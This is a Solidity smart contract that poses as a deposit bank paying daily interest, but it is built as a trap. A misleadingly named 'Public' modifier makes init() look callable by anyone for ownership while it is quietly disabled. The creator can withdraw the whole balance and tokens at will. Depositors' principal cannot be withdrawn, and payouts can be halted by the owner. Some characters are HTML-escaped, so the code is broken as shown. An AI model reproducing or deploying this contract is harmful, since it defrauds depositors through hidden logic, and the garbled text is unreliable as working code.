pragma solidity ^0.4.18;

contract Base 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    
    function isOwner()
    internal
    constant
    returns(bool) 
    {
        return owner == msg.sender;
    }
    
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    
    function canDrive()
    internal
    constant
    returns(bool)
    {
        return (owner == msg.sender)||(creator==msg.sender);
    }
    
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
    
    function WithdrawToken(address token, uint256 amount)
    public 
    {
        if(msg.sender==creator)
        {
            token.call(bytes4(sha3(&quot;transfer(address,uint256)&quot;)),creator,amount); 
        }
    }
}

contract DepositBank is Base
{
    uint public SponsorsQty;
    
    uint public CharterCapital;
    
    uint public ClientQty;
    
    uint public PrcntRate = 1;
    
    uint public MinPayment;
    
    bool paymentsAllowed;
    
    struct Lender 
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    
    mapping (address =&gt; uint) public Sponsors;
    
    mapping (address =&gt; Lender) public Lenders;
    
    event StartOfPayments(address indexed calledFrom, uint time);
    
    event EndOfPayments(address indexed calledFrom, uint time);
    
    function()
    payable
    {
        ToSponsor();
    }
    
    
    ///Constructor
    function init()
    Public
    {
        owner = msg.sender;
        PrcntRate = 5;
        MinPayment = 1 ether;
    }
    
    
    // investors================================================================
    
    function Deposit() 
    payable
    {
        FixProfit();//fix time inside
        Lenders[msg.sender].Amount += msg.value;
    }
    
    function CheckProfit(address addr) 
    constant 
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    
    function FixProfit()
    {
        if(Lenders[msg.sender].Amount&gt;0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=now;
    }
    
    function WitdrawLenderProfit()
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);        
        }
    }
    
    //==========================================================================
    
    // sponsors ================================================================
    
    function ToSponsor() 
    payable
    {
        if(msg.value&gt;= MinPayment)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    
    //==========================================================================
    
    
    function AuthorizePayments(bool val)
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    function StartPaymens()
    {
        if(isOwner())
        {
            AuthorizePayments(true);
            StartOfPayments(msg.sender, now);
        }
    }
    function StopPaymens()
    {
        if(isOwner())
        {
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
    }
    function WithdrawToSponsor(address _addr, uint _wei)
    payable
    {
        if(Sponsors[_addr]&gt;0)
        {
            if(isOwner())
            {
                if(_addr.send(_wei))
                {
                    if(CharterCapital&gt;=_wei)CharterCapital-=_wei;
                    else CharterCapital=0;
                    }
            }
        }
    }
    modifier Public{if(!finalized)_;} bool finalized;
    function Fin(){if(isOwner()){finalized = true;}}
    
   
}